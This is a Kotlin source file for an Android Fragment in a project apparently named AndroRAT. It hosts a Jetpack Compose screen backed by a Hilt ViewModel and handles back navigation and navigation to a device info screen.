package com.ierusalem.androrat.features.rtc_features.rtc.presentation

import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.compose.runtime.getValue
import androidx.compose.ui.platform.ComposeView
import androidx.fragment.app.Fragment
import androidx.fragment.app.viewModels
import androidx.lifecycle.compose.collectAsStateWithLifecycle
import androidx.navigation.fragment.findNavController
import com.ierusalem.androrat.R
import com.ierusalem.androrat.core.ui.theme.AndroRATTheme
import com.ierusalem.androrat.core.utils.executeWithLifecycle
import com.ierusalem.androrat.features.rtc_features.rtc.domain.AndroRtcNavigation
import com.ierusalem.androrat.features.rtc_features.rtc.domain.AndroRtcViewModel
import dagger.hilt.android.AndroidEntryPoint

@AndroidEntryPoint
class AndroRtcFragment : Fragment() {

    private val viewModel: AndroRtcViewModel by viewModels()

    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {
        return ComposeView(requireContext()).apply {
            setContent {
                val uiState by viewModel.uiState.collectAsStateWithLifecycle()
                AndroRATTheme {
                    AndroRtcScreen(
                        uiState = uiState,
                        eventHandler = viewModel::handleEvents,
                    )
                }
            }
        }
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        viewModel.screenNavigation.executeWithLifecycle(
            lifecycle = viewLifecycleOwner.lifecycle,
            action = ::executeNavigation
        )
    }

    fun executeNavigation(navigation: AndroRtcNavigation){
        when(navigation){
            AndroRtcNavigation.OnNavBackClicked -> { findNavController().popBackStack() }
            AndroRtcNavigation.OnDeviceClicked -> {
                findNavController().navigate(R.id.action_androRtcFragment_to_androRtcInfoFragment)
            }
        }
    }

}